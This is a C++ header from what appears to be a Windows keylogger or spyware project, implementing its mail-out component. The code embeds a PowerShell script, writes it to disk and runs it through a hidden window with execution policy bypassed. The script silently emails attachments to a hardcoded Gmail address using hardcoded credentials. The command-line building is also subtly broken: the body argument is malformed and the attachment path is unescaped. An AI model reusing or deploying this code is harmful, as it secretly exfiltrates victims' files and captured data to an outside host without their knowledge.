#ifndef SENDMAIL_H
#define SENDMAIL_H

#include <fstream>
#include <vector>
#include <windows.h>
#include "Timer.h"
#include "Helper.h"
#include "IO.h"

#define SCRIPT_NAME "SendMailPowerShellScript.ps1"

namespace Mail {
    #define EM_TO "YourEmail@gmail.com"
    #define EM_FROM "YourEmail@gmail.com"
    #define EM_PASSWORD "YourPassword"

    const std::string &PowerShellScript =   "Param( \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
                                            "[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
                                            " {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
                                            "[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
                                            "[String]$From,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        "
                                            "[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
                                            "[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
                                            "[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
                                            "[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
                                            "System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
                                            "\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
                                            "                        $Attachments = $attachment -split (\"\\:\\:\");\r\n                      "
                                            "  ForEach ($val in $Attachments)\r\n                    "
                                            "        {\r\n               "
                                            "                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
                                            "         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
                                            "}\r\n                catch\r\n                    {\r\n                        exit 2; "
                                            "\r\n                    }\r\n            }\r\n "
                                            "           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
                                            "           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
                                            "System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
                                            "           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
                                            "exit 7; \r\n          }\r\n      catch\r\n          {\r\n            exit 3; "
                                            "  \r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
                                            "Send-EMail -attachment $Att "
                                            "-To \"" +
                                             std::string (EM_TO) +
                                             "\""
                                            " -Body $Body -Subject $Subj "
                                            "-password \"" +
                                             std::string (EM_PASSWORD) +
                                              "\""
                                            " -From \"" +
                                             std::string (EM_FROM) +
                                            "\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";

    #undef EM_FROM
    #undef EM_TO
    #undef EM_PASSWORD

    Timer mTimer;

    std::string stringReplace(std::string s, const std::string toReplace, const std::string replaceWith) {
        if(toReplace.empty()) return s;

        size_t sp = 0; // sp stands for string position
        while((sp = s.find(toReplace, sp)) != std::string::npos) {  // npos - 'until the end od string'
            s.replace(sp, toReplace.size(), replaceWith);
            sp += replaceWith.size();
        }

        return s;
    }

    bool checkIfFileExists(const std::string &f) {
        std::ifstream file(f);
        return (bool)file;
    }

    bool createScript() {
        std::ofstream scriptStream(IO::getOurPath(true) + std::string(SCRIPT_NAME));

        if(!scriptStream) { // if script creation failed
            return false;
        }

        scriptStream << PowerShellScript;

        if(!scriptStream) {
            return false;
        }

        scriptStream.close();
        return true;
    }

    // return values are for debugging
    int sendMail(const std::string &subject, const std::string &body, const std::string &attachment) {
        bool ok;

        ok = IO::makeDir(IO::getOurPath(true));
        if(!ok) return -1;

        std::string scriptPath = IO::getOurPath(true) + std::string(SCRIPT_NAME);
        if(!checkIfFileExists(scriptPath)) {
            ok = createScript();
        }
        if(!ok) return -2;

        // string for running powershell
        std::string param = "-ExecutionPolicy ByPass -File \"" + scriptPath + "\" -Subj \"" + stringReplace(subject, "\"", "\\\"") +
                            "\" -Body" + stringReplace(body, "\"", "\\\"") + "\" -Att \"" + attachment + "\"";

        SHELLEXECUTEINFO shellExecInfo = {0};
        shellExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
        shellExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
        shellExecInfo.hwnd = NULL;
        shellExecInfo.lpVerb = "open";  // basically same as right-click -> open
        shellExecInfo.lpFile = "powershell";
        shellExecInfo.lpParameters = param.c_str();
        shellExecInfo.lpDirectory = NULL;
        shellExecInfo.nShow = SW_HIDE;  // hides powershell window
        shellExecInfo.hInstApp =NULL;

        ok = (bool) ShellExecuteEx(&shellExecInfo);
        if(!ok) return -3;

        WaitForSingleObject(shellExecInfo.hProcess, 7000);   // wait for max 7 seconds
        DWORD exitCode = 100;
        GetExitCodeProcess(shellExecInfo.hProcess, &exitCode);

        // lambda function
        mTimer.setFunc([&]() {
            WaitForSingleObject(shellExecInfo.hProcess, 60000);  // wait for a minute max
            GetExitCodeProcess(shellExecInfo.hProcess, &exitCode);
            if((int)exitCode == STILL_ACTIVE) {
                TerminateProcess(shellExecInfo.hProcess, 100);
            }
            Helper::writeAppLog("<From sendMail> Return Code: " + Helper::toString((int)exitCode));

        });

        mTimer.setRepeatCount(1L);
        mTimer.setInterval(10L);
        mTimer.start(true);

        return (int)exitCode;
    }

    // when there are multiple attachments
    int sendMail(const std::string &subject, const std::string body, const std::vector<std::string> &allAttachments) {
        std::string attachments = "";

        if(allAttachments.size() == 1U) {
            attachments = allAttachments.at(0);
        } else {
            for(const auto &val : allAttachments) {
                attachments += val + "::";  // powershell script handles splitting all attachments joined by '::'
            }
            attachments = attachments.substr(0, attachments.length() - 2);  // -2 to remove last '::'
        }

        return sendMail(subject, body, attachments);
    }
}

#endif // SENDMAIL_H
